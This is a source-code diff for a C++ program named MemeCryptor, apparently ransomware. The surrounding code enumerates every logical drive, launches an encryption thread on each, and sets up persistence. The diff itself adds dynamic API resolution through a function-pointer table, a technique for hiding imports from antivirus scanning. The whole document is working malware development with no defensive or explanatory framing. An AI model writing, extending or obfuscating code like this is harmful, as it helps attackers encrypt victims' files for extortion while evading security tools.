@@ -1,21 +1,22 @@
-// MemeCryptor.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
-
-using namespace std;
 #include "Persistent.h"
 #include "Crypto.h"
-#include <iostream>
 #include "Threading.h"
 #include "File.h"
+#include "PE.h"
+extern FARPROC APIArray[52];
 
 int beginEncrypt() {
-	DWORD driveStrSize = GetLogicalDriveStringsA(0, 0);
+	typedef DWORD(WINAPI* MemeGetLogicalDriveStringsA)(DWORD nBufferLength, LPSTR lpBuffer);
+
+	MemeGetLogicalDriveStringsA TempGetLogicalDriveStringsA = (MemeGetLogicalDriveStringsA)APIArray[2];
+
+	DWORD driveStrSize = TempGetLogicalDriveStringsA(0, 0);
 	LPSTR driveBuffer = (LPSTR)calloc(driveStrSize + 2, 1);
 	if (!driveBuffer) {
 		return -1;
 	}
 
-	GetLogicalDriveStringsA(driveStrSize, driveBuffer);
+	TempGetLogicalDriveStringsA(driveStrSize, driveBuffer);
 
 	for (int i = 0; i < driveStrSize - 1; i += strlen(driveBuffer) + 1) {
 		launchThreadEncrypt(driveBuffer + i);
@@ -24,8 +25,11 @@ int beginEncrypt() {
 	return 0;
 }
 
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
-{
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+	if (initAPIArray() == -1) {
+		return -1;
+	}
+
 	if (mainPersist() == -1) {
 		return -1;
 	}
@@ -43,7 +47,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	cryptCleanUp();
 	cleanExplorerLL();
 	persistCleanUp();
-
 
 	return 0;
 
